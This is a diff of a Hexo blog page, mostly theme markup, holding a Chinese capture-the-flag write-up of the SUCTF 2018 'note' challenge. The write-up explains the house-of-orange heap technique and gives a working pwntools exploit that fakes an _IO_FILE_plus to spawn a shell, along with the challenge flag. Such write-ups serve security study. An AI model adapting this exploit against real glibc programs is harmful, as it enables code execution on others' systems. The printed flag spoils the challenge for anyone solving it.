@@ -1,98 +1,173 @@
 <!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  
+<html lang="en">
 
-  
-  <title>suctf2018-note | Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="house of orange – note基础知识 unsorted bin的解链操作没有类似于malloc中p-&amp;gt;fd-&amp;gt;bk == p的检查  small bins和fastbin存在内存大小相等的区域，例如32位操作系统，fastbin的chunk为64字节以下的16，24,32……；同时，small bins的大小也是从16开始依次相差8字节的chunk大小。但是两者不在同一">
-<meta property="og:type" content="article">
-<meta property="og:title" content="suctf2018-note">
-<meta property="og:url" content="http://yoursite.com/2018/06/05/suctf2018-note/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="house of orange – note基础知识 unsorted bin的解链操作没有类似于malloc中p-&amp;gt;fd-&amp;gt;bk == p的检查  small bins和fastbin存在内存大小相等的区域，例如32位操作系统，fastbin的chunk为64字节以下的16，24,32……；同时，small bins的大小也是从16开始依次相差8字节的chunk大小。但是两者不在同一">
-<meta property="og:image" content="http://yoursite.com/2018/06/05/suctf2018-note/iolistall.png">
-<meta property="og:image" content="http://yoursite.com/2018/06/05/suctf2018-note/iofile.png">
-<meta property="og:image" content="http://yoursite.com/2018/06/05/suctf2018-note/ida.png">
-<meta property="og:image" content="http://yoursite.com/2018/06/05/suctf2018-note/stack.png">
-<meta property="og:image" content="http://yoursite.com/2018/06/05/suctf2018-note/add.png">
-<meta property="og:image" content="http://yoursite.com/2018/06/05/suctf2018-note/show.png">
-<meta property="og:image" content="http://yoursite.com/2018/06/05/suctf2018-note/dele.png">
-<meta property="og:updated_time" content="2018-06-05T15:56:35.955Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="suctf2018-note">
-<meta name="twitter:description" content="house of orange – note基础知识 unsorted bin的解链操作没有类似于malloc中p-&amp;gt;fd-&amp;gt;bk == p的检查  small bins和fastbin存在内存大小相等的区域，例如32位操作系统，fastbin的chunk为64字节以下的16，24,32……；同时，small bins的大小也是从16开始依次相差8字节的chunk大小。但是两者不在同一">
-<meta name="twitter:image" content="http://yoursite.com/2018/06/05/suctf2018-note/iolistall.png">
-  
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
-  
-  
-    <link rel="icon" href="/favicon.png">
-  
-  
-    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
-  
-  <link rel="stylesheet" href="/css/style.css">
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="house of orange – note基础知识
+unsorted bin的解链操作没有类似于malloc中p-&amp;gt;fd-&amp;gt;bk == p的检查
+
+small bins和fastbin存在内存大小相等的区域，例如32位操作系统，fastbin的chunk为64字节以下的16，24,32">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="John Doe">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="suctf2018-note"/>
+    
+
+    <!--Open Graph Description-->
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="Hexo"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>suctf2018-note - Hexo</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
 </head>
 
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
-      </h1>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
-        
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
-      </div>
-    </div>
-  </div>
-</header>
-      <div class="outer">
-        <section id="main"><article id="post-suctf2018-note" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/06/05/suctf2018-note/" class="article-date">
-  <time datetime="2018-06-05T15:54:33.000Z" itemprop="datePublished">2018-06-05</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="article-title" itemprop="name">
-      suctf2018-note
-    </h1>
-  
 
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    Home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    Archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about.html">
+                    About
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/tags">
+                    Tags
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories">
+                    Categories
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact.html">
+                    Contact
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2018/06/05/suctf2018-note/">
+                suctf2018-note
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2018-06-05</span>
+            
+            
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
         <h1 id="house-of-orange-–-note"><a href="#house-of-orange-–-note" class="headerlink" title="house of orange – note"></a>house of orange – note</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><ol>
 <li><p>unsorted bin的解链操作没有类似于malloc中<code>p-&gt;fd-&gt;bk == p</code>的检查</p>
 </li>
@@ -143,138 +218,188 @@
 <p>采用的方法是，通过缓冲区溢出修改下一个位于unsorted bin 的chunk大小为0x61，在这个chunk里存放伪造的<code>_IO_FILE_plus</code>。此时再分配一个大于0x60大小的内存，由于unsorted bin中的块不能满足要求，则会先将这个块放入对应大小的small bins里，然后再查找下一块。查找下一块时由于unsorted bin attack已经破坏了chunk的FD，由此就会触发<code>malloc_printerr</code>函数，遍历<code>_IO_list_all</code>，第一个结点已经转移unsorted bin上，但不满足条件，于是通过chain字段找到下一个结点，也就是我们伪造的结点，最终能够执行<code>system</code>。</p>
 <h3 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#SUCTF&#123;Me1z1jiu_say_s0rry_LOL&#125;</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p = process(<span class="string">'./note'</span>)</span><br><span class="line">	libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	gdb.attach(p,<span class="string">"b _IO_str_overflow"</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	libc = ELF(<span class="string">'./libc6_2.24-12ubuntu1_amd64.so'</span>)</span><br><span class="line">	p = remote(<span class="string">'pwn.suctf.asuri.org'</span>,<span class="number">20003</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Choice&gt;&gt;'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Choice&gt;&gt;'</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Choice&gt;&gt;'</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'(yes:1)'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">16</span>,<span class="string">'1'</span>*<span class="number">16</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak system address</span></span><br><span class="line">dele()</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">offset =  <span class="number">0x7f1b15e2ab78</span><span class="number">-0x7f1b15a66000</span></span><br><span class="line">libc_base = libc_addr - <span class="number">88</span> - <span class="number">0x10</span> - libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">sys_addr = libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">malloc_hook = libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">io_list_all = libc_base+libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">binsh_addr = libc_base+next(libc.search(<span class="string">'/bin/sh'</span>))+<span class="number">5</span></span><br><span class="line">log.info(<span class="string">'sys_addr:%#x'</span> %sys_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#unsorted bin attack </span></span><br><span class="line">fake_chunk = p64(<span class="number">0x8002</span>)+p64(<span class="number">0x61</span>) <span class="comment">#header</span></span><br><span class="line">fake_chunk += p64(<span class="number">0xddaa</span>)+p64(io_list_all<span class="number">-0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fake IO_FILE_PLUS</span></span><br><span class="line">fake_IFP = p64(<span class="number">0x2</span>)+p64(<span class="number">0xffffffffffffff</span>) + p64(<span class="number">0</span>)*<span class="number">2</span> +p64((binsh_addr<span class="number">-0x64</span>)/<span class="number">2</span>)</span><br><span class="line">fake_IFP = fake_IFP.ljust(<span class="number">0x80</span>,<span class="string">'\x00'</span>)</span><br><span class="line">fake_IFP += p64(sys_addr+<span class="number">0x420</span>)</span><br><span class="line">fake_IFP = fake_IFP.ljust(<span class="number">0xa0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">fake_IFP += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">vtable_addr = malloc_hook<span class="number">-0x1370</span><span class="comment">#+libc.symbols['_IO_str_jumps']</span></span><br><span class="line">fake_IFP += p64(<span class="number">0</span>)</span><br><span class="line">fake_IFP += p64(<span class="number">0</span>)</span><br><span class="line">fake_IFP += p64(vtable_addr)</span><br><span class="line">fake_IFP += p64(sys_addr)</span><br><span class="line">fake_IFP += p64(<span class="number">2</span>)</span><br><span class="line">fake_IFP += p64(<span class="number">3</span>) </span><br><span class="line">fake_IFP += p64(<span class="number">0</span>)*<span class="number">3</span> </span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">16</span> +fake_chunk+fake_IFP</span><br><span class="line">payload += p64(sys_addr)</span><br><span class="line"></span><br><span class="line">add(<span class="number">16</span>,payload)<span class="comment">#3</span></span><br><span class="line"><span class="comment">#add a large chunk</span></span><br><span class="line">p.recvuntil(<span class="string">'Choice&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x200</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-      
     </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/06/05/suctf2018-note/" data-id="cjix4iudb00042clumngrhqch" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-    
-<nav id="article-nav">
-  
-    <a href="/2018/06/27/青岛链弯杯-note/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          青岛链弯杯--note
-        
-      </div>
-    </a>
-  
-  
-    <a href="/2018/06/05/hitbctf2018-once/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">hitbctf2018-once</div>
-    </a>
-  
-</nav>
 
-  
-</article>
-
-</section>
-        
-          <aside id="sidebar">
-  
     
 
-  
     
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
-    <div class="widget">
-      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn-how2heap/">pwn;how2heap</a></li></ul>
-    </div>
-  </div>
 
-
-  
+    <!-- Comments -->
     
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/pwn-how2heap/" style="font-size: 10px;">pwn;how2heap</a>
-    </div>
-  </div>
 
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a></li></ul>
+</div>
+        </section>
+
     </div>
-  </div>
+</div>
 
 
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2018/06/27/青岛链弯杯-note/">青岛链弯杯--note</a>
-          </li>
-        
-          <li>
-            <a href="/2018/06/05/suctf2018-note/">suctf2018-note</a>
-          </li>
-        
-          <li>
-            <a href="/2018/06/05/hitbctf2018-once/">hitbctf2018-once</a>
-          </li>
-        
-          <li>
-            <a href="/2018/06/05/fastbin-attack-search/">fastbin_attack-search</a>
-          </li>
-        
-          <li>
-            <a href="/2018/03/13/unsortedbin-attack-0ctf-zerostorage/">unsortedbin_attack--0ctf zerostorage</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
+</div>
 
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      &copy; 2018 John Doe<br>
-      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                <h2>About</h2>
+                <p>
+                    This theme was developed by <a href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
+                </p>
+            </div>
+            
+    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+            <li>
+                <a class="footer-post" href="/2018/06/27/青岛链弯杯-note/">青岛链弯杯--note</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2018/06/05/suctf2018-note/">suctf2018-note</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2018/06/05/hitbctf2018-once/">hitbctf2018-once</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2018/06/05/fastbin-attack-search/">fastbin_attack-search</a>
+            </li>
+            
+        </ul>
     </div>
-  </div>
+
+
+
+            
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klugjo/hexo-theme-alpha-dust">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/?lang=en">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.instagram.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://dribbble.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://plus.google.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-google-plus"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.behance.net/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-behance"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://500px.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-500px"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:test@example.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="\#">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-rss"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    @Untitled. All right reserved | Design & Hexo <a href="http://www.codeblocq.com/">Jonathan Klughertz</a>
+                </div>
+            </div>
+        </div>
+    </div>
 </footer>
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
-    
 
-<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<!-- After footer scripts -->
 
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
 
-  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
-  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
 
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
 
-<script src="/js/script.js"></script>
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
 
 
 
-  </div>
 </body>
+
 </html>
